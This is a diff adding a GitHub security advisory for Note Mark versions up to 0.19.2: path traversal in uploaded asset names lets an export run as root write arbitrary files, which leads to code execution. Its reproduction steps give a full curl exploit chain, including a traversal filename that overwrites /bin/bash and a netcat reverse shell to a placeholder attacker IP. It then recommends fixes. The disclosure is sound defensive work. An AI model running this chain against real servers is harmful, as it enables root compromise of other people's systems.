@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-g49p-4qxj-88v3",
+  "modified": "2026-05-07T21:19:36.161650Z",
+  "published": "2026-05-07T21:06:55Z",
+  "aliases": [
+    "CVE-2026-44522"
+  ],
+  "summary": "Note Mark: Arbitrary File Write via Path Traversal in Asset Names Leads to Remote Code Execution",
+  "details": "### Description\n\nThe Note Mark application allows authenticated users to upload assets to notes via `POST /api/notes/{noteID}/assets`, where the asset filename is provided through the `X-Name` HTTP request header. This value is stored directly in the database without any sanitization or validation - no path separator filtering, no directory traversal sequence rejection, and no use of `filepath.Base()` to strip directory components. The unsanitized name is persisted as-is in the `note_assets` table (`Name` column, `varchar(80)`).\n\nWhen an administrator subsequently runs the data export CLI commands (`note-mark migrate export-v1` or `note-mark migrate export`), the stored asset name is passed directly into `filepath.Join()` and `path.Join()` calls as part of the output file path argument to `os.Create()`. Since Go's `filepath.Join()` resolves `../` sequences during path normalization, an attacker-controlled asset name containing directory traversal sequences causes the export process to write files to arbitrary locations on the filesystem, completely outside the intended export directory.\n\nThe export process typically runs as root (the default in Docker deployments and common in bare-metal setups). This means the arbitrary file write operates with root privileges, allowing an attacker to write to any writable location on the filesystem. This can be escalated to Remote Code Execution by overwriting system binaries such as `/bin/bash` with a malicious payload. Since the Go binary is statically compiled and does not shell out to external programs during the export, overwriting `/bin/bash` does not affect the running export process. However, the next time any user or administrator invokes `bash` on the system, the attacker-controlled binary executes instead, resulting in code execution as root. In environments with cron or systemd, writing to `/etc/cron.d/` or systemd unit files provides additional exploitation paths.\n\nThe data flow is: `X-Name` HTTP header \u003e `handlers/assets.go` (no validation) \u003e `services/assets.go` (stored to DB as-is) \u003e `cli/migrate.go` (used in `os.Create(filepath.Join(..., asset.Name))`) \u003e arbitrary file write.\n\n#### Source Code Analysis\n\nThe asset upload handler at `backend/handlers/assets.go:48-51` extracts the filename directly from the `X-Name` header:\n\n```go\ntype PostNoteAssetInput struct {\n    NoteID  uuid.UUID `path:\"noteID\" format:\"uuid\"`\n    Name    string    `header:\"X-Name\" required:\"true\"`\n    RawBody []byte    `required:\"true\"`\n}\n```\n\nThe service layer at `backend/services/assets.go:39-42` stores this value without validation:\n\n```go\nnoteAsset := db.NoteAsset{\n    NoteID: noteID,\n    Name:   name,\n}\n```\n\nThe V1 export function at `backend/cli/migrate.go:328` uses the unsanitized name directly:\n\n```go\nf, err := os.Create(filepath.Join(noteDir, asset.Name))\n```\n\nThe non-V1 export function at `backend/cli/migrate.go:223` similarly uses it:\n\n```go\nf, err := os.Create(path.Join(assetsDir, asset.ID.String()+\".\"+asset.Name))\n```\n\nIn both cases, `filepath.Join` / `path.Join` resolves `../` sequences in `asset.Name`, causing the resulting path to escape the intended directory.\n\n\n### Steps to Reproduce\n\n1. Start a Note Mark instance (version 0.19.2 or earlier) using the official Docker image: `docker run -d --name notemark -p 8080:8080 -e JWT_SECRET=\"$(openssl rand -base64 32)\" -e PUBLIC_URL=\"http://localhost:8080\" ghcr.io/enchant97/note-mark-aio:0.19.2`\n\n2. Register a user account: `curl -s -X POST http://localhost:8080/api/users -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"password\":\"Attack3r!\",\"name\":\"attacker\"}'`\n\n3. Authenticate and capture the session cookie: `curl -s -D - -X POST http://localhost:8080/api/auth/token -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"password\":\"Attack3r!\",\"grant_type\":\"password\"}'`. Save the `Auth-Session-Token` cookie value from the `Set-Cookie` response header.\n\n4. Create a notebook: `curl -s -X POST http://localhost:8080/api/books -H 'Content-Type: application/json' -b 'Auth-Session-Token=\u003cTOKEN\u003e' -d '{\"name\":\"test\",\"slug\":\"test\"}'`. Note the returned `id` as `BOOK_ID`.\n\n5. Create a note in the notebook: `curl -s -X POST http://localhost:8080/api/books/\u003cBOOK_ID\u003e/notes -H 'Content-Type: application/json' -b 'Auth-Session-Token=\u003cTOKEN\u003e' -d '{\"name\":\"test\",\"slug\":\"test\"}'`. Note the returned `id` as `NOTE_ID`.\n\n6. Upload an asset with a reverse shell payload in the body and a path traversal filename in the `X-Name` header targeting `/bin/bash`: `curl -s -X POST http://localhost:8080/api/notes/\u003cNOTE_ID\u003e/assets -b 'Auth-Session-Token=\u003cTOKEN\u003e' -H 'X-Name: ../../../../../../bin/bash' -H 'Content-Type: application/octet-stream' -d '#!/bin/sh\\nnc \u003cATTACKER_IP\u003e \u003cPORT\u003e -e /bin/sh'`. Confirm the response contains `\"name\":\"../../../../../../bin/bash\"`, showing the traversal payload was stored without sanitization.\n\n7. Trigger the export as an administrator (simulating the admin running a routine data export): `docker exec notemark /note-mark migrate export-v1 --export-dir /data/backup`\n\n8. Verify `/bin/bash` was overwritten with the attacker payload: `docker exec notemark cat /bin/bash`. The file should contain the reverse shell script instead of the original bash binary, confirming arbitrary file write.\n\n9. Start a listener on the attacker machine (`nc -lvnp \u003cPORT\u003e`), then invoke bash on the target: `docker exec notemark bash`. A reverse shell connects back to the attacker as root, confirming Remote Code Execution.\n\n#### Proof of Concept (Video) \n[note-mark-path-traversal-rce.webm](https://github.com/user-attachments/assets/6969a00a-3ad1-4e30-b5ce-9e780da4fa2b)\n\n\n### Recommendations\n\nThe root cause is the complete absence of input validation on the `X-Name` header value used as the asset filename. The fix should be applied at two layers.\n\nAt the input layer in the asset upload handler, the application should reject any asset name containing path separators (`/`, `\\`) or directory traversal sequences (`..`). The simplest approach is to apply `filepath.Base()` to the incoming name, which strips all directory components and returns only the final filename element. Names that resolve to empty strings or `.` after this operation should be rejected. This validation should be applied in the `PostNoteAsset` handler before the name reaches the service layer.\n\nAt the export layer in the CLI migration code, the application should apply `filepath.Base()` to `asset.Name` before using it in any file path construction as a defense-in-depth measure. This ensures that even if a malicious name exists in the database (from before the input validation was added), the export process cannot be exploited. Both the V1 export path at `migrate.go:328` and the standard export path at `migrate.go:223` require this fix.\n\n\nReported By: Ravindu Wickramasinghe (rvz) - Zyenra Security -  www.zyenra.com",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/enchant97/note-mark/backend",
+        "purl": "pkg:golang/github.com/enchant97/note-mark/backend"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260501152243-db3f72bff780"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-g49p-4qxj-88v3/GHSA-g49p-4qxj-88v3.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/enchant97/note-mark/security/advisories/GHSA-g49p-4qxj-88v3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/enchant97/note-mark"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/enchant97/note-mark/releases/tag/v0.19.4"
+    }
+  ]
+}
